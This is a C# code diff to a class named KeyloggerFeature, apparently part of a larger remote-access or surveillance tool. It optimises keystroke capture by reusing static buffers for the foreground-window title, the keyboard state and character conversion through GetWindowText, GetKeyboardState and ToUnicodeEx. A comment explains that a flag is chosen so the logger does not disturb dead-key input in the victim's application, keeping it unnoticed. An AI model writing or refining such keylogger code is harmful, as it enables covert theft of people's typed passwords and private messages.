@@ -76,6 +76,9 @@ internal static class KeyloggerFeature
     private static readonly object        _startLock = new();
     private static nint   _lastHwnd;
     private static string _lastTitle = string.Empty;
+    private static readonly StringBuilder _titleSb = new(256);
+    private static readonly byte[]        _kbState  = new byte[256];
+    private static readonly StringBuilder _charSb   = new(8);
 
     // ── Public API ──────────────────────────────────────────────────────────
 
@@ -205,9 +208,9 @@ internal static class KeyloggerFeature
         if (hwnd != _lastHwnd)
         {
             _lastHwnd = hwnd;
-            var sb = new StringBuilder(256);
-            GetWindowText(hwnd, sb, 256);
-            string title = sb.ToString();
+            _titleSb.Clear();
+            GetWindowText(hwnd, _titleSb, 256);
+            string title = _titleSb.ToString();
             if (title != _lastTitle && !string.IsNullOrEmpty(title))
             {
                 _lastTitle = title;
@@ -225,12 +228,12 @@ internal static class KeyloggerFeature
         uint threadId = GetWindowThreadProcessId(hwnd, out _);
         nint hkl = GetKeyboardLayout(threadId);
 
-        var ks = new byte[256];
-        GetKeyboardState(ks);
-        var charBuf = new StringBuilder(8);
+        Array.Clear(_kbState, 0, 256);
+        GetKeyboardState(_kbState);
+        _charSb.Clear();
         // Flag 4 = don't modify the dead-key state — avoids breaking ^+a→â composition in the target app
-        int n = ToUnicodeEx(vk, sc, ks, charBuf, 8, 4, hkl);
-        string chars = n > 0 ? charBuf.ToString(0, n) : (charBuf.Length > 0 ? charBuf.ToString(0, 1) : "");
+        int n = ToUnicodeEx(vk, sc, _kbState, _charSb, 8, 4, hkl);
+        string chars = n > 0 ? _charSb.ToString(0, n) : (_charSb.Length > 0 ? _charSb.ToString(0, 1) : "");
 
         lock (_bufLock)
         {
